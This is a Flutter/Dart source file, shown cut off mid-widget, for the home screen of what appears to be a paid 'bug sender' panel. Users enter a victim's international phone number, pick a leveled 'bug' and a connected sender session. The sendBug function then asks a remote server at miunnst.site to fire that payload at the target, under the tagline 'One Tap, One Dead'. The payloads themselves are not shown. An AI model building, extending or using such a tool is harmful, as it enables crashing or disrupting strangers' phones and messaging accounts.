import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _slideController;
  late AnimationController _pulseController;
  late AnimationController _shimmerController;
  late Animation<double> _fadeAnimation;
  late Animation<Offset> _slideAnimation;
  late Animation<double> _pulseAnimation;
  late Animation<double> _shimmerAnimation;

  String selectedBugId = "";
  bool _isSending = false;
  String? _responseMessage;

  // Sender
  List<dynamic> _globalSenders = [];
  List<dynamic> _privateSenders = [];
  Map<String, dynamic>? _selectedSender;
  bool _loadingSenders = false;
  int _senderTabIndex = 1; // default: private. 0 = global (owner only)

  // Tema warna hitam biru
  final Color primaryDark = const Color(0xFF0D0900);
  final Color primaryBlue = const Color(0xFFB8860B);
  final Color accentBlue = const Color(0xFFFFD700);
  final Color lightBlue = const Color(0xFFFFEC6E);
  final Color cardDark = const Color(0xFF201900);
  final Color cardDarker = const Color(0xFF1A1400);
  final Color successGreen = const Color(0xFF10B981);
  final Color warningOrange = const Color(0xFFF59E0B);
  final Color dangerRed = const Color(0xFFEF4444);

  // Video Player Variables
  late VideoPlayerController _videoController;
  late ChewieController _chewieController;
  bool _isVideoInitialized = false;

  bool get _isOwner => widget.role.toLowerCase() == 'owner' || widget.role.toLowerCase() == 'creator';

  @override
  void initState() {
    super.initState();

    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1000),
    );

    _slideController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _shimmerController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 2000),
    )..repeat();

    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeInOut),
    );

    _slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.3),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _slideController, curve: Curves.easeOut));

    _pulseAnimation = Tween<double>(begin: 0.95, end: 1.05).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );

    _shimmerAnimation = Tween<double>(begin: -2.0, end: 2.0).animate(
      CurvedAnimation(parent: _shimmerController, curve: Curves.easeInOut),
    );

    _fadeController.forward();
    _slideController.forward();

    // Default tab: owner starts at global, others at private
    _senderTabIndex = _isOwner ? 0 : 1;

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    _initializeVideoPlayer();
    _fetchSenders();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset('assets/videos/banner.mp4');
    _videoController.initialize().then((_) {
      _videoController.setVolume(1.0);
      setState(() {
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true,
          looping: true,
          showControls: false,
          startAt: Duration.zero,
          allowMuting: false,
        );
        _isVideoInitialized = true;
      });
    }).catchError((error) {
      print("Video initialization error: $error");
      setState(() => _isVideoInitialized = false);
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _slideController.dispose();
    _pulseController.dispose();
    _shimmerController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  // FIX: Helper toleran terhadap berbagai tipe data dari server
  // (bool true, integer 1, string "true", string "1")
  bool _isConnected(dynamic sender) {
    final v = sender['connected'];
    return v == true ||
        v == 1 ||
        v?.toString().toLowerCase() == 'true' ||
        v?.toString() == '1';
  }

  Future<void> _fetchSenders() async {
    setState(() => _loadingSenders = true);
    const baseUrl = 'http://miunnst.site:4035';
    try {
      List<dynamic> globals = [];
      List<dynamic> privates = [];

      // Global sender hanya di-fetch kalau owner
      if (_isOwner) {
        final resGlobal = await http.get(
          Uri.parse('$baseUrl/globalSender?key=${widget.sessionKey}'),
        );
        if (resGlobal.statusCode == 200) {
          final d = jsonDecode(resGlobal.body);
          if (d['valid'] == true) globals = d['connections'] ?? [];
        }
      }

      final resPrivate = await http.get(
        Uri.parse('$baseUrl/mySender?key=${widget.sessionKey}'),
      );
      if (resPrivate.statusCode == 200) {
        final d = jsonDecode(resPrivate.body);
        if (d['valid'] == true) privates = d['connections'] ?? [];
      }

      setState(() {
        _globalSenders = globals;
        _privateSenders = privates;
        // FIX: Gunakan _isConnected() agar toleran tipe data dari server
        final activeSrc = _senderTabIndex == 0 ? globals : privates;
        final connected = activeSrc.where((s) => _isConnected(s)).toList();
        _selectedSender = connected.isNotEmpty
            ? {...Map<String, dynamic>.from(connected.first), '_type': _senderTabIndex == 0 ? 'global' : 'private'}
            : null;
      });
    } catch (_) {
      // Gagal fetch sender, biarkan kosong
    } finally {
      setState(() => _loadingSenders = false);
    }
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showNotification("Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.",
          dangerRed);
      return;
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final senderId = _selectedSender?['id']?.toString() ?? '';
      final senderParam = senderId.isNotEmpty ? '&sender=$senderId' : '';
      final res = await http.get(Uri.parse(
          "http://miunnst.site:4035/sendBug?key=$key&target=$target&bug=$selectedBugId$senderParam"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage = "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug ke $target!");
        targetController.clear();
      }
    } catch (_) {
      setState(() => _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showNotification(String title, String msg, Color color) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        content: Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: cardDarker,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: color.withOpacity(0.5)),
            boxShadow: [
              BoxShadow(
                color: color.withOpacity(0.3),
                blurRadius: 8,
                spreadRadius: 1,
              ),
            ],
          ),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: color.withOpacity(0.2),
                  shape: BoxShape.circle,
                ),
                child: Icon(
                  color == successGreen
                      ? Icons.check_circle
                      : color == dangerRed
                          ? Icons.error
                          : Icons.info,
                  color: color,
                  size: 20,
                ),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Text(
                      title,
                      style: const TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        fontSize: 14,
                      ),
                    ),
                    const SizedBox(height: 2),
                    Text(
                      msg,
                      style: TextStyle(
                        color: Colors.white.withOpacity(0.8),
                        fontSize: 12,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        behavior: SnackBarBehavior.floating,
        margin: const EdgeInsets.all(16),
        duration: const Duration(seconds: 4),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: FadeTransition(
        opacity: _fadeAnimation,
        child: SlideTransition(
          position: _slideAnimation,
          child: SingleChildScrollView(
            padding: EdgeInsets.zero,
            child: Column(
              children: [
                // Header dengan padding normal
                Padding(
                  padding: const EdgeInsets.fromLTRB(16, 16, 16, 0),
                  child: _buildHeaderSection(),
                ),
                const SizedBox(height: 16),
                // Video FULL WIDTH — tanpa padding, tanpa radius
                _buildVideoSection(),
                // Sisanya dengan padding normal
                Padding(
                  padding: const EdgeInsets.fromLTRB(16, 24, 16, 24),
                  child: Column(
                    children: [
                      _buildControlPanel(),
                      const SizedBox(height: 24),
                      _buildSendButton(),
                      const SizedBox(height: 16),
                      if (_responseMessage != null) _buildResponseMessage(),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildHeaderSection() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(16),
        gradient: LinearGradient(
          colors: [primaryBlue, accentBlue],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        boxShadow: [
          BoxShadow(
            color: accentBlue.withOpacity(0.3),
            blurRadius: 15,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: Column(
        children: [
          Row(
            children: [
              AnimatedBuilder(
                animation: _pulseAnimation,
                builder: (context, child) {
                  return Transform.scale(
                    scale: _pulseAnimation.value,
                    child: Container(
                      width: 60,
                      height: 60,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(
                            color: Colors.white.withOpacity(0.3), width: 2),
                      ),
                      child: ClipOval(
                        child: Image.asset(
                          'assets/images/logo.jpg',
                          fit: BoxFit.cover,
                        ),
                      ),
                    ),
                  );
                },
              ),
              const SizedBox(width: 16),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      widget.username,
                      style: const TextStyle(
                        color: Colors.white,
                        fontSize: 20,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 4),
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 4),
                          decoration: BoxDecoration(
                            color: _isOwner
                                ? Colors.amber.withOpacity(0.3)
                                : Colors.white.withOpacity(0.2),
                            borderRadius: BorderRadius.circular(12),
                            border: _isOwner
                                ? Border.all(
                                    color: Colors.amber.withOpacity(0.6),
                                    width: 1)
                                : null,
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              if (_isOwner) ...[
                                const Icon(Icons.workspace_premium,
                                    color: Colors.amber, size: 12),
                                const SizedBox(width: 4),
                              ],
                              Text(
                                widget.role.toUpperCase(),
                                style: TextStyle(
                                  color:
                                      _isOwner ? Colors.amber : Colors.white,
                                  fontSize: 12,
                                  fontWeight: FontWeight.bold,
                                ),
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: Colors.white.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Column(
                  children: [
                    const Text(
                      "EXPIRES",
                      style: TextStyle(
                        color: Colors.white,
                        fontSize: 10,
                        fontWeight: FontWeight.w500,
                      ),
                    ),
                    Text(
                      widget.expiredDate,
                      style: const TextStyle(
                        color: Colors.white,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildVideoSection() {
    return AspectRatio(
      aspectRatio: 16 / 9,
      child: SizedBox(
        width: double.infinity,
        child: Stack(
          fit: StackFit.expand,
          children: [
            if (_isVideoInitialized)
              Chewie(controller: _chewieController)
            else
              Container(
                color: cardDarker,
                child: Center(
                  child: CircularProgressIndicator(color: accentBlue),
                ),
              ),
            // Gradient overlay bawah
            Positioned.fill(
              child: DecoratedBox(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.transparent,
                      Colors.black.withOpacity(0.72),
                    ],
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    stops: const [0.55, 1.0],
                  ),
                ),
              ),
            ),
            // Teks tagline
            Positioned(
              bottom: 18,
              left: 18,
              right: 18,
              child: Text(
                "One Tap, One Dead",
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 0.5,
                  shadows: [
                    Shadow(
                      color: Colors.black.withOpacity(0.7),
                      blurRadius: 8,
                      offset: const Offset(0, 2),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildControlPanel() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: cardDark,
        borderRadius: BorderRadius.circular(16),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.3),
            blurRadius: 10,
            offset: const Offset(0, 5),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            "Control Panel",
            style: TextStyle(
              color: Colors.white,
              fontSize: 18,
              fontWeight: FontWeight.bold,
            ),
          ),
          const SizedBox(height: 16),
          _buildModernInput(
            controller: targetController,
            label: "Nomor Sikimak",
            hint: "e.g. +62xxxxxxxxxx",
            icon: Icons.phone_android,
            keyboardType: TextInputType.phone,
          ),
          const SizedBox(height: 16),
          _buildFeatureSlider(),
          const SizedBox(height: 20),
          _buildSenderSection(),
        ],
      ),
    );
  }

  Widget _buildModernInput({
    required TextEditingController controller,
    required String label,
    required String hint,
    required IconData icon,
    TextInputType? keyboardType,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: const TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.w500,
          ),
        ),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(
            color: cardDarker,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: accentBlue.withOpacity(0.3)),
          ),
          child: TextField(
            controller: controller,
            keyboardType: keyboardType,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              hintText: hint,
              hintStyle: TextStyle(color: Colors.white.withOpacity(0.5)),
              prefixIcon: Icon(icon, color: accentBlue),
              border: InputBorder.none,
              contentPadding:
                  const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildFeatureSlider() {
    final bugs = widget.listBug;
    if (bugs.isEmpty) return const SizedBox();

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const Text(
          "pilih fitur",
          style: TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.w500,
          ),
        ),
        const SizedBox(height: 8),
        SizedBox(
          height: 120,
          child: ListView.builder(
            scrollDirection: Axis.horizontal,
            itemCount: bugs.length,
            itemBuilder: (context, index) {
              final bug = bugs[index];
              final bugId = bug['bug_id'] as String;
              final bugName = bug['bug_name'] as String? ?? bugId;
              final isSelected = selectedBugId == bugId;

              // Level label berdasarkan urutan
              final levelLabel = 'LVL ${index + 1}';

              return GestureDetector(
                onTap: () => setState(() => selectedBugId = bugId),
                child: AnimatedContainer(
                  duration: const Duration(milliseconds: 220),
                  curve: Curves.easeInOut,
                  width: 110,
                  margin: EdgeInsets.only(
                    right: index < bugs.length - 1 ? 10 : 0,
                  ),
                  decoration: BoxDecoration(
                    color: isSelected
                        ? accentBlue.withOpacity(0.18)
                        : cardDarker,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: isSelected
                          ? accentBlue
                          : accentBlue.withOpacity(0.25),
                      width: isSelected ? 1.8 : 1,
                    ),
                    boxShadow: isSelected
                        ? [
                            BoxShadow(
                              color: accentBlue.withOpacity(0.3),
                              blurRadius: 12,
                              offset: const Offset(0, 4),
                            ),
                          ]
                        : [],
                  ),
                  child: Stack(
                    children: [
                      // Check mark pojok kanan atas
                      if (isSelected)
                        Positioned(
                          top: 8,
                          right: 8,
                          child: Container(
                            width: 20,
                            height: 20,
                            decoration: BoxDecoration(
                              color: accentBlue,
                              shape: BoxShape.circle,
                            ),
                            child: const Icon(
                              Icons.check,
                              color: Colors.white,
                              size: 12,
                            ),
                          ),
                        ),
                      Padding(
                        padding: const EdgeInsets.fromLTRB(12, 14, 12, 12),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            // Icon bug
                            Container(
                              width: 32,
                              height: 32,
                              decoration: BoxDecoration(
                                color: accentBlue.withOpacity(
                                    isSelected ? 0.25 : 0.1),
                                borderRadius: BorderRadius.circular(8),
                              ),
                              child: Icon(
                                Icons.bug_report,
                                color: isSelected
                                    ? accentBlue
                                    : accentBlue.withOpacity(0.5),
                                size: 18,
                              ),
                            ),
                            const SizedBox(height: 6),
                            // Bug name
                            Text(
                              bugName,
                              style: TextStyle(
                                color: isSelected
                                    ? Colors.white
                                    : Colors.white60,
                                fontSize: 11,
                                fontWeight: FontWeight.w600,
                                fontFamily: 'Rajdhani',
                              ),
                              maxLines: 2,
                              overflow: TextOverflow.ellipsis,
                            ),
                            const SizedBox(height: 4),
                            // Level badge
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: isSelected
                                    ? accentBlue.withOpacity(0.25)
                                    : Colors.white.withOpacity(0.06),
                                borderRadius: BorderRadius.circular(5),
                                border: Border.all(
                                  color: isSelected
                                      ? accentBlue.withOpacity(0.7)
                                      : Colors.white12,
                                ),
                              ),
                              child: Text(
                                levelLabel,
                                style: TextStyle(
                                  color: isSelected
                                      ? accentBlue
                                      : Colors.white30,
                                  fontSize: 9,
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 0.5,
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              );
            },
          ),
        ),
      ],
    );
  }

  Widget _buildModernDropdown({
    required String label,
    required String value,
    required List<Map<String, dynamic>> items,
    required Function(String?) onChanged,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          label,
          style: const TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.w500,
          ),
        ),
        const SizedBox(height: 8),
        Container(
          decoration: BoxDecoration(
            color: cardDarker,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: accentBlue.withOpacity(0.3)),
          ),
          child: DropdownButtonHideUnderline(
            child: DropdownButton<String>(
              value: value,
              dropdownColor: cardDarker,
              isExpanded: true,
              icon: Icon(Icons.arrow_drop_down, color: accentBlue),
              style: const TextStyle(color: Colors.white),
              items: items.map((bug) {
                return DropdownMenuItem<String>(
                  value: bug['bug_id'],
                  child: Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 16),
                    child: Text(bug['bug_name'],
                        style: const TextStyle(color: Colors.white)),
                  ),
                );
              }).toList(),
              onChanged: onChanged,
            ),
          ),
        ),
      ],
    );
  }

  // ────────────────────────────────────────────────────────────────
  // SENDER SECTION — redesigned, owner-only global
  // ────────────────────────────────────────────────────────────────
  Widget _buildSenderSection() {
    final List<Map<String, dynamic>> globalSenders = _globalSenders
        .map((s) => {...Map<String, dynamic>.from(s), '_type': 'global'})
        .toList();
    final List<Map<String, dynamic>> privateSenders = _privateSenders
        .map((s) => {...Map<String, dynamic>.from(s), '_type': 'private'})
        .toList();

    final isGlobalTab = _senderTabIndex == 0;
    final activeSenders = isGlobalTab ? globalSenders : privateSenders;

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        // ── Header ────────────────────────────────────────────────
        Row(
          children: [
            Container(
              padding:
                  const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: isGlobalTab
                      ? [const Color(0xFFB8860B), const Color(0xFFFFD700)]
                      : [const Color(0xFF6B21A8), const Color(0xFFA855F7)],
                ),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Row(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Icon(
                    isGlobalTab ? Icons.public : Icons.lock,
                    color: Colors.white,
                    size: 12,
                  ),
                  const SizedBox(width: 5),
                  Text(
                    isGlobalTab ? 'SENDER GLOBAL' : 'SENDER PRIVATE',
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 11,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Rajdhani',
                      letterSpacing: 0.8,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(width: 8),
            if (_loadingSenders)
              SizedBox(
                width: 12,
                height: 12,
                child:
                    CircularProgressIndicator(color: accentBlue, strokeWidth: 2),
              ),
            const Spacer(),
            // Refresh
            GestureDetector(
              onTap: _fetchSenders,
              child: Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: accentBlue.withOpacity(0.1),
                  shape: BoxShape.circle,
                  border:
                      Border.all(color: accentBlue.withOpacity(0.3)),
                ),
                child: Icon(Icons.refresh, color: accentBlue, size: 14),
              ),
            ),
          ],
        ),

        const SizedBox(height: 12),

        // ── Tab Toggle Bar ─────────────────────────────────────────
        Container(
          height: 50,
          padding: const EdgeInsets.all(4),
          decoration: BoxDecoration(
            color: cardDarker,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: Colors.white.withOpacity(0.06)),
          ),
          child: Row(
            children: [
              // ── GLOBAL tab (owner only) ──────────────────────────
              if (_isOwner)
                Expanded(
                  child: GestureDetector(
                    onTap: () => setState(() {
                      _senderTabIndex = 0;
                      if (_selectedSender?['_type'] != 'global') {
                        _selectedSender = null;
                      }
                    }),
                    child: AnimatedContainer(
                      duration: const Duration(milliseconds: 280),
                      curve: Curves.easeInOut,
                      decoration: BoxDecoration(
                        gradient: isGlobalTab
                            ? const LinearGradient(
                                colors: [
                                  Color(0xFFB8860B),
                                  Color(0xFFFFD700),
                                ],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              )
                            : null,
                        borderRadius: BorderRadius.circular(12),
                        boxShadow: isGlobalTab
                            ? [
                                BoxShadow(
                                  color: const Color(0xFFFFD700).withOpacity(0.4),
                                  blurRadius: 12,
                                  offset: const Offset(0, 4),
                                ),
                              ]
                            : [],
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          // Crown icon for owner-exclusive global
                          Container(
                            padding: const EdgeInsets.all(4),
                            decoration: BoxDecoration(
                              color: isGlobalTab
                                  ? Colors.amber.withOpacity(0.25)
                                  : Colors.white.withOpacity(0.05),
                              borderRadius: BorderRadius.circular(6),
                            ),
                            child: Icon(
                              Icons.workspace_premium,
                              size: 12,
                              color: isGlobalTab
                                  ? Colors.amber
                                  : Colors.white30,
                            ),
                          ),
                          const SizedBox(width: 6),
                          Text(
                            'GLOBAL',
                            style: TextStyle(
                              color: isGlobalTab
                                  ? Colors.white
                                  : Colors.white38,
                              fontSize: 11,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1.2,
                              fontFamily: 'Rajdhani',
                            ),
                          ),
                          const SizedBox(width: 6),
                          _buildCountBadge(
                            count: globalSenders.length,
                            active: isGlobalTab,
                            color: const Color(0xFFFFD700),
                          ),
                        ],
                      ),
                    ),
                  ),
                ),

              // ── PRIVATE tab ──────────────────────────────────────
              Expanded(
                child: GestureDetector(
                  onTap: () => setState(() {
                    _senderTabIndex = 1;
                    if (_selectedSender?['_type'] != 'private') {
                      _selectedSender = null;
                    }
                  }),
                  child: AnimatedContainer(
                    duration: const Duration(milliseconds: 280),
                    curve: Curves.easeInOut,
                    decoration: BoxDecoration(
                      gradient: !isGlobalTab
                          ? const LinearGradient(
                              colors: [
                                Color(0xFF6B21A8),
                                Color(0xFFA855F7),
                              ],
                              begin: Alignment.topLeft,
                              end: Alignment.bottomRight,
                            )
                          : null,
                      borderRadius: BorderRadius.circular(12),
                      boxShadow: !isGlobalTab
                          ? [
                              BoxShadow(
                                color: Colors.purple.withOpacity(0.4),
                                blurRadius: 12,
                                offset: const Offset(0, 4),
                              ),
                            ]
                          : [],
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(
                          Icons.lock,
                          size: 13,
                          color:
                              !isGlobalTab ? Colors.white : Colors.white38,
                        ),
                        const SizedBox(width: 6),
                        Text(
                          'PRIVATE',
                          style: TextStyle(
                            color:
                                !isGlobalTab ? Colors.white : Colors.white38,
                            fontSize: 11,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.2,
                            fontFamily: 'Rajdhani',
                          ),
                        ),
                        const SizedBox(width: 6),
                        _buildCountBadge(
                          count: privateSenders.length,
                          active: !isGlobalTab,
                          color: Colors.purple,
                        ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),

        const SizedBox(height: 10),

        // ── Owner-only info banner (global tab) ────────────────────
        if (isGlobalTab && _isOwner)
          Container(
            margin: const EdgeInsets.only(bottom: 10),
            padding:
                const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
            decoration: BoxDecoration(
              color: Colors.amber.withOpacity(0.07),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: Colors.amber.withOpacity(0.25)),
            ),
            child: Row(
              children: [
                const Icon(Icons.workspace_premium,
                    color: Colors.amber, size: 14),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    'Global sender tersedia untuk Owner Dan Creator',
                    style: TextStyle(
                      color: Colors.amber.withOpacity(0.8),
                      fontSize: 11,
                      fontFamily: 'Rajdhani',
                    ),
                  ),
                ),
              ],
            ),
          ),

        // ── Sender Cards / Picker ──────────────────────────────────
        AnimatedSwitcher(
          duration: const Duration(milliseconds: 220),
          transitionBuilder: (child, anim) =>
              FadeTransition(opacity: anim, child: child),
          child: activeSenders.isEmpty
              ? _buildEmptySenderState(isGlobalTab, key: ValueKey('empty_$_senderTabIndex'))
              : _buildSenderCards(activeSenders, isGlobalTab,
                  key: ValueKey('cards_$_senderTabIndex')),
        ),
      ],
    );
  }

  Widget _buildCountBadge({
    required int count,
    required bool active,
    required Color color,
  }) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
      decoration: BoxDecoration(
        color: active ? Colors.white.withOpacity(0.2) : color.withOpacity(0.12),
        borderRadius: BorderRadius.circular(6),
        border: Border.all(
          color: active ? Colors.white.withOpacity(0.3) : color.withOpacity(0.2),
        ),
      ),
      child: Text(
        '$count',
        style: TextStyle(
          color: active ? Colors.white : color.withOpacity(0.5),
          fontSize: 9,
          fontWeight: FontWeight.bold,
        ),
      ),
    );
  }

  Widget _buildEmptySenderState(bool isGlobal, {Key? key}) {
    final color = isGlobal ? const Color(0xFFFFD700) : Colors.purple;
    return Container(
      key: key,
      padding: const EdgeInsets.symmetric(vertical: 18, horizontal: 16),
      decoration: BoxDecoration(
        color: cardDarker,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: color.withOpacity(0.2)),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(
            isGlobal ? Icons.public_off : Icons.lock_outline,
            color: color.withOpacity(0.4),
            size: 20,
          ),
          const SizedBox(width: 10),
          Text(
            _loadingSenders
                ? 'Memuat sender...'
                : isGlobal
                    ? 'Belum ada global sender.'
                    : 'Belum ada private sender.',
            style:
                const TextStyle(color: Colors.white38, fontSize: 13),
          ),
        ],
      ),
    );
  }

  Widget _buildSenderCards(List<Map<String, dynamic>> senders, bool isGlobal,
      {Key? key}) {
    final color = isGlobal ? const Color(0xFFFFD700) : Colors.purple;
    final connectedSenders =
        senders.where((s) => _isConnected(s)).toList();
    final disconnectedSenders =
        senders.where((s) => !_isConnected(s)).toList();
    final sorted = [...connectedSenders, ...disconnectedSenders];

    return Column(
      key: key,
      children: sorted.map((sender) {
        final name =
            sender['sessionName'] ?? sender['label'] ?? 'Unnamed';
        final number = sender['phone'] ?? sender['number'] ?? '';
        // FIX: Toleran terhadap bool/int/string dari server
        final connected = _isConnected(sender);
        final id = sender['id']?.toString() ?? '';
        final isSelected = _selectedSender?['id']?.toString() == id;

        return GestureDetector(
          onTap: connected
              ? () => setState(() => _selectedSender = sender)
              : null,
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            margin: const EdgeInsets.only(bottom: 8),
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: isSelected
                  ? color.withOpacity(0.15)
                  : cardDarker,
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: isSelected
                    ? color.withOpacity(0.7)
                    : connected
                        ? color.withOpacity(0.2)
                        : Colors.white.withOpacity(0.06),
                width: isSelected ? 1.5 : 1,
              ),
              boxShadow: isSelected
                  ? [
                      BoxShadow(
                        color: color.withOpacity(0.2),
                        blurRadius: 10,
                        offset: const Offset(0, 3),
                      ),
                    ]
                  : [],
            ),
            child: Row(
              children: [
                // Status dot + icon
                Stack(
                  children: [
                    Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(
                        color: connected
                            ? Colors.green.withOpacity(0.12)
                            : Colors.red.withOpacity(0.08),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                          color: connected
                              ? Colors.green.withOpacity(0.3)
                              : Colors.red.withOpacity(0.2),
                        ),
                      ),
                      child: Icon(
                        isGlobal ? Icons.public : Icons.lock,
                        color: connected
                            ? color.withOpacity(0.85)
                            : Colors.white24,
                        size: 20,
                      ),
                    ),
                    Positioned(
